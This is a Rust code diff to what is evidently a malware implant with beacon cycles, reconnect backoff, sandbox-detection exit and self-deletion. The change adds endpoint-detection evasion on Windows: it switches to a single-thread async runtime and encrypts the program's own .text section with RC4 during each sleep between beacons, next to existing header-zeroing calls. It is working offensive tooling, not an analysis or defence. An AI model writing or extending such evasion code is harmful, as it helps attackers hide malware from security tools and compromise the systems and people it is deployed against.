@@ -91,8 +91,26 @@ fn self_delete(path: &std::path::Path) {
     }
 }
 
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
+fn main() -> anyhow::Result<()> {
+    // edr-evasion on Windows: use single-thread runtime so no tokio worker threads
+    // execute .text code during the RC4 encryption window between beacon cycles.
+    // Other builds keep the default multi-thread runtime.
+    #[cfg(all(target_os = "windows", feature = "edr-evasion"))]
+    let rt = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .expect("tokio runtime");
+
+    #[cfg(not(all(target_os = "windows", feature = "edr-evasion")))]
+    let rt = tokio::runtime::Builder::new_multi_thread()
+        .enable_all()
+        .build()
+        .expect("tokio runtime");
+
+    rt.block_on(async_main())
+}
+
+async fn async_main() -> anyhow::Result<()> {
     // IMPORTANT: evasion::init() may call std::process::exit(0) for sandbox detection.
     // It must remain the first statement. Do not insert anything before this line
     // that allocates Drop resources or opens handles.
@@ -211,7 +229,9 @@ async fn main() -> anyhow::Result<()> {
         let delay = backoff * (1.0 + jitter);
         dbg_log!("[*] Reconnecting in {delay:.1}s...");
         unsafe { evasion::sleep::zero_headers(); }
+        unsafe { evasion::sleep::encrypt_text_section(); }
         tokio::time::sleep(Duration::from_secs_f64(delay)).await;
+        unsafe { evasion::sleep::decrypt_text_section(); }
         unsafe { evasion::sleep::restore_headers(); }
         backoff = (backoff * 2.0).min(RECONNECT_MAX);
     }
